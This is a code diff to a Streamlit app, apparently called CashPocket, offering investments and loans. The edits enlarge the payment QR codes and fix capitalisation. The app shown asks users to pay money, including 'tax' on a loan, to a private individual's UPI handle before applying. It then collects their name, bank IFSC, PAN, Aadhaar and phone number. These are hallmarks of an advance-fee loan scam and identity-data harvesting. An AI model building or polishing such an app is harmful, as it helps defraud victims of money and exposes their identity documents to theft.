@@ -42,7 +42,7 @@ with tab1:
         st.markdown("### 📲 Step 1: Make Payment to UPI")
 
         upi_url = f"upi://pay?pa=ayushbhradwaj009-1@okicici&pn=AyushBhardwaj&am={invest_amount}&cu=INR"
-        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=100x100&data={urllib.parse.quote(upi_url)}"
+        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=500x500&data={urllib.parse.quote(upi_url)}"  # Increased size
         st.image(qr_url, caption="Scan to Pay", use_container_width=True)
 
         st.code("ayushbhradwaj009-1@okicici", language="text")
@@ -78,12 +78,12 @@ with tab2:
         st.warning(f"⚠️ You must pay ₹{total_payable:.2f} (₹{tax:.2f} is tax).")
 
         upi_url_loan = f"upi://pay?pa=ayushbhradwaj009-1@okicici&pn=AyushBhardwaj&am={total_payable}&cu=INR"
-        qr_url_loan = f"https://api.qrserver.com/v1/create-qr-code/?size=100x100&data={urllib.parse.quote(upi_url_loan)}"
+        qr_url_loan = f"https://api.qrserver.com/v1/create-qr-code/?size=500x500&data={urllib.parse.quote(upi_url_loan)}"  # Increased size
         st.image(qr_url_loan, caption="Scan to Pay", use_container_width=True)
 
         st.code("ayushbhradwaj009-1@okicici", language="text")
 
-        loan_paid = st.checkbox("✅ apply for loan easily with cashpocket ")
+        loan_paid = st.checkbox("✅ Apply for loan easily with CashPocket")
 
         if loan_paid:
             name = st.text_input("Full Name")
@@ -105,7 +105,7 @@ with tab2:
                     "IFSC": ifsc,
                     "PAN": pan,
                     "Aadhaar": aadhaar,
-                    "number": contect_number,
+                    "Number": contect_number,
                     "Submitted On": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 })
                 st.success("Loan request submitted! Our team will review it.")
